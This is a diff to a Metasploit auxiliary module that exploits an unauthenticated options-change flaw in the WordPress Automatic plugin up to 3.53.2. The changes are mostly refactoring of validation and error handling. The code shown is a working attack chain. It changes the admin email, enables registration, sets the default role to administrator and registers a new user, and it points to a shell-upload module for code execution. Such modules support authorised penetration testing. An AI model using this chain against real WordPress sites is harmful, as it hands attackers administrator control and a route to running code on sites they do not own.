@@ -15,10 +15,10 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'WordPress Plugin Automatic Config Change to RCE',
         'Description' => %q{
           This module exploits an unauthenticated arbitrary wordpress options change vulnerability
-          in the Automatic (wp-automatic) plugin.  If WPEMAIL is provided, the administrator's email
-          address will be changed.  User registration is
-          enabled, and default user role is set to administrator.  A user is then created with
-          the USER name set.  A valid EMAIL is required to get the registration email (not handled in MSF).
+          in the Automatic (wp-automatic) plugin <= 3.53.2. If WPEMAIL is provided, the administrator's email
+          address will be changed. User registration is
+          enabled, and default user role is set to administrator. A user is then created with
+          the USER name set. A valid EMAIL is required to get the registration email (not handled in MSF).
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -42,12 +42,12 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options [
-      OptString.new('EMAIL', [true, 'Email for registration', nil]),
+      OptString.new('EMAIL', [true, 'Email for registration', nil, nil, URI::MailTo::EMAIL_REGEXP]),
       OptString.new('USER', [true, 'Username for registration', 'msfuser'])
     ]
 
     register_advanced_options [
-      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil])
+      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil, nil, URI::MailTo::EMAIL_REGEXP])
     ]
   end
 
@@ -61,12 +61,9 @@ class MetasploitModule < Msf::Auxiliary
       checkcode = Exploit::CheckCode::Vulnerable
     else
       checkcode = Exploit::CheckCode::Safe
-    end
-
-    if checkcode == Exploit::CheckCode::Safe
       print_error('Automatic not a vulnerable version')
     end
-    return checkcode
+    checkcode
   end
 
   def set_wp_option(key, value)
@@ -83,31 +80,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     # lots of copy pasta from wp_gdpr_compliance_privesc
-    if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
+    if datastore['WPEMAIL'].present?
       print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
-      unless set_wp_option('admin_email', datastore['WPEMAIL'])
-        print_error('Failed to change the admin e-mail address')
-        return
-      end
+      fail_with(Failure::UnexpectedReply, 'Failed to change the admin e-mail address') unless set_wp_option('admin_email', datastore['WPEMAIL'])
     end
 
     print_status('Enabling user registrations...')
-    unless set_wp_option('users_can_register', '1')
-      print_error('Failed to enable user registrations')
-      return
-    end
+    fail_with(Failure::UnexpectedReply, 'Failed to enable user registrations') unless set_wp_option('users_can_register', '1')
 
     print_status('Setting the default user role type to administrator...')
-    unless set_wp_option('default_role', 'administrator')
-      print_error('Failed to set the default user role')
-      return
-    end
+    fail_with(Failure::UnexpectedReply, 'Failed to set the default user role') unless set_wp_option('default_role', 'administrator')
 
     print_status("Registering #{datastore['USER']} with email #{datastore['EMAIL']}")
-    unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
-      print_error('Failed to register user')
-      return
-    end
+    fail_with(Failure::UnexpectedReply, 'Failed to register user') unless datastore['EMAIL'].present? && wordpress_register(datastore['USER'], datastore['EMAIL'])
 
     vprint_good('For a shell: use exploits/unix/webapp/wp_admin_shell_upload')
   end
